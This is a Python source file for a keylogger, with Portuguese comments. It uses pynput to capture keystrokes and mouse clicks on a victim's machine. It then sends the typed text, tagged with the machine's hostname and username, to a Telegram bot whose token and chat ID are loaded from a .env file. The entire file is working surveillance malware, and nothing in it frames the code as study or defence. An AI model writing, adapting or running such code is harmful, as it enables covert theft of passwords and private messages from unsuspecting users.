from pynput.keyboard import Key, Listener
from pynput import mouse
from dotenv import load_dotenv
from pynput import keyboard, mouse

import httpx
import asyncio
import telebot
import re
import getpass
import socket
import os

load_dotenv()

FULLLOG = ''
WORDS = ''

CHAR_MIN_TO_SEND = 5
CHAR_MAX_TO_SEND = 50

HEADER_MESSAGE = f"maquina: {socket.gethostname()}" + "\n" + f"user: {getpass.getuser()}"

BOT_TOKEN = os.getenv("BOT_TOKEN")
CHAT_ID = os.getenv("CHAT_ID")

if not BOT_TOKEN or not CHAT_ID:
    raise RuntimeError(
        "BOT_TOKEN e CHAT_ID não foram encontrados. Verifique o arquivo .env."
    )
    

BOT = telebot.TeleBot(BOT_TOKEN)


def onPress(key, loop):
    global WORDS
    global FULLLOG

    if key == Key.space:
        WORDS += ' '

    elif key == Key.backspace:
        WORDS = WORDS[:-1]
               
    elif key == Key.enter:
        FULLLOG += WORDS + '\n'

        messageFormated = formatMessage(FULLLOG)

        if len(messageFormated.strip()) > 0 and len(messageFormated) <= CHAR_MAX_TO_SEND:
            asyncio.run_coroutine_threadsafe(send(messageFormated), loop)

        WORDS = ''
        FULLLOG = ''

    else:
        if (hasattr(key, 'char') and key.char) or key == Key.caps_lock:
            char = str(key)
            char = char.replace("'", "")
            WORDS += char
    
async def send(message):
    async with httpx.AsyncClient(timeout=10) as client:

        url = f'https://api.telegram.org/bot{BOT_TOKEN}/sendMessage'

        payload = {
            'chat_id': CHAT_ID,
            'text': HEADER_MESSAGE + "\n" + f"message: {message}",
        }

        response = await client.post(url, data=payload)
        return response.json()
    
def onClick(x, y, button, pressed, loop):
    global FULLLOG
    global WORDS

    if len(WORDS) > 0 and pressed:
        messageFormated = formatMessage(FULLLOG + WORDS)

        if len(messageFormated) >= CHAR_MIN_TO_SEND:
            FULLLOG += WORDS + '\n'

            if len(messageFormated) <= CHAR_MAX_TO_SEND:
                asyncio.run_coroutine_threadsafe(send(messageFormated), loop)

            WORDS = ''
            FULLLOG = ''
    else:
        pass

def formatMessage(message):
    regex = r"Key\.caps_lock(.*?)Key\.caps_lock"
    
    return re.sub(
    regex,
    lambda m: m.group(1).upper(),
    message
    )
    
async def main():
    loop = asyncio.get_running_loop()

    # Inicia os listeners passando o 'loop' como parâmetro via lambda
    k_listener = keyboard.Listener(on_press=lambda key: onPress(key, loop))
    m_listener = mouse.Listener(on_click=lambda x, y, button, pressed: onClick(x, y, button, pressed, loop))

    # Inicia os escutadores sem usar .join() bloqueante
    k_listener.start()
    m_listener.start()

    while True:
        await asyncio.sleep(3600)

if __name__ == '__main__':
    try:
        asyncio.run(main())
    except KeyboardInterrupt:
        print("Programa encerrado.")